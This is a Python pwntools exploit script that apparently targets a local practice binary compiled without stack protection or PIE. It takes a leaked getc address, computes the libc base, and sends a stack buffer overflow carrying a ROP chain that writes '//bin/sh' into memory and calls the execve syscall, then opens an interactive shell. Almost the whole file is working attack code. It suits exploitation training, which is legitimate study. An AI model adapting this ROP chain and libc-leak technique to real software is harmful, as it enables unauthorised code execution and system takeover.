#!/usr/bin/python

from pwn import *

# Target copiled with:
# gcc target.c -fno-stack-protector -no-pie -o target
target = "./target"

elf = ELF(target)
libc = ELF('/usr/lib/libc.so.6')

def main():
    p = process(target)
    input("Attach gdb and press enter to continue...")
    getc = p.recvline()[-15:-1]

    # Calc libc address
    log.info("getc() address: " + str(getc))
    libc.address = int(getc, 16) - libc.symbols['getc']
    log.info("libc address: " + hex(libc.address))

    # ROP chain generated with ropper execve
    
    IMAGE_BASE_0 = libc.address 
    rebase = lambda x : p64(int(x) + IMAGE_BASE_0)

    rop = b'A' * 24         # Padding to reach the return address
    rop += rebase(0x025fb8) # 0x025fb8: pop r13; ret; 
    rop += b'//bin/sh'      # Command to execute
    rop += rebase(0x02e211) # 0x02e211: pop rbx; ret; 
    rop += rebase(0x1d8000) # Data Destination
    rop += rebase(0x055325) # 0x055325: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p64(0xdeadbeefdeadbeef)  # Dummy
    rop += p64(0xdeadbeefdeadbeef)  # Dummy
    rop += p64(0xdeadbeefdeadbeef)  # Dummy
    rop += p64(0xdeadbeefdeadbeef)  # Dummy
    rop += rebase(0x025fb8) # 0x025fb8: pop r13; ret; 
    rop += p64(0x0)         # String terminator
    rop += rebase(0x02e211) # 0x02e211: pop rbx; ret; 
    rop += rebase(0x1d8008) # Data Destination
    rop += rebase(0x055325) # 0x055325: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p64(0xdeadbeefdeadbeef)  # Dummy
    rop += p64(0xdeadbeefdeadbeef)  # Dummy
    rop += p64(0xdeadbeefdeadbeef)  # Dummy
    rop += p64(0xdeadbeefdeadbeef)  # Dummy
    rop += rebase(0x023d35) # 0x023d35: pop rdi; ret; 
    rop += rebase(0x1d8000)
    rop += rebase(0x025641) # 0x025641: pop rsi; ret; 
    rop += rebase(0x1d8008)
    rop += rebase(0x04e062) # 0x04e062: pop rdx; ret; 
    rop += rebase(0x1d8008)
    rop += rebase(0x03c863) # 0x03c863: pop rax; ret; 
    rop += p64(0x3b)        # execve syscall
    rop += rebase(0x0829e6) # 0x0829e6: syscall; ret; 

    p.sendline(rop)
    p.interactive()

if __name__ == '__main__':
    main()